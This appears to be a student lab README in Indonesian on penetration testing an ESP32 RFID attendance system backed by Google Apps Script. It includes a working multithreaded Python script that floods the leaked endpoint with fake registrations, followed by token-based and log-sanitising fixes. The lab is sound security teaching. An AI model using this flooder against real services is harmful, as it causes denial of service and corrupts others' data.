

# 🛡️ Penetration Testing: Sistem Absensi
     Attack & Defense Lab

Repositori ini dibuat untuk mendemonstrasikan simulasi pengujian keamanan dasar (**Attack Simulation**) dan strategi mitigasi (**Defense**) pada sistem absensi berbasis ESP32 yang terintegrasi dengan Google Spreadsheet (via Google Apps Script).

---
# ANGGOTA KELOMPOK 3
- Harwidi Wahyu Eka Saputra (09030282327036)
- Akbar Arnoval S (09030282327066)
- M Walid Farhan (09030282327039)
- Julian Afriansyah (09030282327024)
- Rangga Saputra (09030282327051)

---

# 🎯 Tujuan Lab
1.  **Reconnaissance:** Memahami bagaimana informasi sensitif (URL Endpoint) bisa bocor melalui Serial Monitor.
2.  **Exploitation:** Melakukan simulasi serangan (*flooding*) ke endpoint yang terekspos.
3.  **Hardening:** Mengamankan sistem dengan mekanisme *Secret Token* dan sanitasi log.

---


# Deskripsi Perangkat (Sistem Absensi)
Sebelum masuk ke Penetration Testing dan Defent , berikut adalah gambaran umum perangkat keras yang digunakan.

## 🧰 Teknologi & Hardware Digunakan
- *ESP32*  
  Sebagai mikrokontroler utama dan koneksi Wi-Fi ke Google Apps Script.
- *RFID RC522 / MFRC522*  
  Untuk membaca ID kartu.
- *LCD 16x2 I2C*  
  Untuk menampilkan informasi absensi.
- *Buzzer Aktif*  
  Notifikasi bunyi.
- *Push Button*  
  Untuk fitur pulang cepat dan Pendaftaran Kartu.
- *Google Spreadsheet + Google Apps Script*  
  Sebagai database absensi otomatis.

## 📡 Alur Kerja Sistem
1. ESP32 terhubung ke Wi-Fi.  
2. Pengguna men-tap kartu RFID.  
3. ESP32 mengirim ID kartu ke Google Apps Script via HTTP Request.  
4. Apps Script menulis data ke Google Spreadsheet.  
5. LCD I2C menampilkan status absensi.  
6. Buzzer memberikan notifikasi.  
7. Jika push button ditekan → mode Pulang Cepat.
---

# ⚔️ Bagian 1: Attack Simulation (Red Team)
**Skenario:** Penyerang memiliki akses fisik ke perangkat ESP32 dan mencoba mencuri URL API untuk membanjiri database dengan data sampah.

# Langkah A: Koneksi & Reconnaissance
1.  Hubungkan ESP32 ke Laptop menggunakan kabel USB.
2.  Pastikan driver terinstal dan perangkat terdeteksi.
3.  Jika menggunakan **VirtualBox** (Linux VM), pastikan USB filter aktif agar ESP32 terbaca (`/dev/ttyUSB0`).

# Langkah B: Mencuri URL Endpoint (Sniffing Serial)
Buka terminal Linux dan cek port serial:
```bash
ls /dev/tty*
````

Buka **Serial Monitor** menggunakan `picocom` (atau tool lain) dengan baudrate `115200`:

```bash
picocom -b 115200 /dev/ttyUSB0
```

**Hasil:** Perhatikan output pada terminal. Salin **URL Google Apps Script** yang terekspos (tercetak) di log serial saat ESP32 mengirim data.

# Langkah C: Melancarkan Serangan (Flooding)

Buat script Python sederhana (gunakan PyCharm/VS Code) untuk mengirim HTTP Request secara terus-menerus ke URL yang didapatkan tadi.
### Berikut Kode Pycharm yang digunakan

import requests
import threading
import time
import uuid
import random

url_target = "Masukan"

# BATAS PENGIRIMAN
TARGET_LIMIT = 300
total_requests = 0
lock = threading.Lock()  # Kunci agar hitungan tidak bentrok antar thread


def attack_google():
    global total_requests
    while True:

        with lock:
            if total_requests >= TARGET_LIMIT:
                break  # Berhenti jika sudah 130

            total_requests += 1
            current_request_num = total_requests

        try:
     
            unique_uid = str(uuid.uuid4())[:8].upper()

 
            random_name = f"BOT_USER_{random.randint(100, 9999)}"

   
            full_url = f"{url_target}?sts=reg&uid={unique_uid}&nama={random_name}"


            response = requests.get(full_url, timeout=5)

            if response.status_code == 200 or response.status_code == 302:
                print(f"[{current_request_num}/{TARGET_LIMIT}] SUKSES: {unique_uid}")
            elif response.status_code == 429:
                print(f"[{current_request_num}/{TARGET_LIMIT}] LIMIT (Server Sibuk)")
            else:
                print(f"[{current_request_num}/{TARGET_LIMIT}] Status: {response.status_code}")

  
            time.sleep(0.5)

        except Exception as e:
            # Jika error koneksi, kurangi hitungan agar dicoba lagi (opsional)
            # Tapi untuk aman, kita biarkan jalan terus
            print(f"[{current_request_num}] Error Koneksi")
            time.sleep(1)


print(f"MEMULAI PENGIRIMAN {TARGET_LIMIT} DATA...")

jumlah_threads = 20
threads = []


for i in range(jumlah_threads):
    t = threading.Thread(target=attack_google)
    t.daemon = True  # Agar thread mati saat program utama selesai
    threads.append(t)

for t in threads:
    t.start()

while True:
    if total_requests >= TARGET_LIMIT:
        print("\n========================================")
        print(f"TARGET TERCAPAI: {total_requests} PERMINTAAN DIKIRIM.")
        print("PROGRAM BERHENTI.")
        print("========================================")
        break
time.sleep(1)

**Dampak yang diharapkan:**

  * 📉 **Resource Exhaustion:** Google Sheet menerima request berlebih.
  * 🚫 **Denial of Service:** Google Apps Script mulai menolak request (Error 429/500).
  * 💾 **Storage Spam:** Spreadsheet penuh dengan data palsu.

# Langkah D: Verifikasi

Cek Google Spreadsheet target.

  * Jika baris baru bertambah dengan sangat cepat → **Serangan Berhasil**.
  * Jika Apps Script error/lambat → **Sistem Overload**.
  * Jika Pada Alat Absensi Di LCD mengeluarkan Teks QUOTA PENUH, CAN'T REGISTERC → **Serangan Berhasil**

-----

# 🛡️ Bagian 2: Defense Implementation (Blue Team)

**Masalah Utama:** Information Disclosure (URL bocor di Serial) dan tidak adanya otentikasi.

### A. Perbaikan Sisi Server (Google Apps Script)

Tambahkan validasi **Secret Token** sebelum memproses data.

```javascript
function doGet(e) {
  // Validasi Secret Token
  if (e.parameter.secret !== "KODE_RAHASIA_SUPER_AMAN") {
    return ContentService.createTextOutput("⛔ UNAUTHORIZED: Access Denied");
  }

  // Lanjut proses simpan data jika token valid...
  // ...
}
```

# B. Perbaikan Sisi Device (ESP32)

1.  Sematkan token rahasia di dalam request HTTP.
2.  **HAPUS** baris kode yang mencetak URL lengkap ke Serial Monitor.

<!-- end list -->

```cpp
// Contoh implementasi request yang aman
String url = "[https://script.google.com/.../exec](https://script.google.com/.../exec)";
String secret = "?secret=KODE_RAHASIA_SUPER_AMAN";

// Kirim request (URL + Secret)
http.begin(url + secret);

// Serial.println(url); // <--- HAPUS BARIS INI (Jangan tampilkan endpoint di log)
```

-----

# 💡 Key Takeaways

| Kategori | Pelajaran Penting |
| :--- | :--- |
| **Attack** 🔴 | Sistem IoT rentan jika log debug (Serial Monitor) memaparkan endpoint sensitif tanpa proteksi. |
| **Defense** 🔵 | Selalu gunakan **Autentikasi** (API Key/Token) dan **Sanitasi Log** (hapus print debug sensitif) pada tahap produksi. |

-----
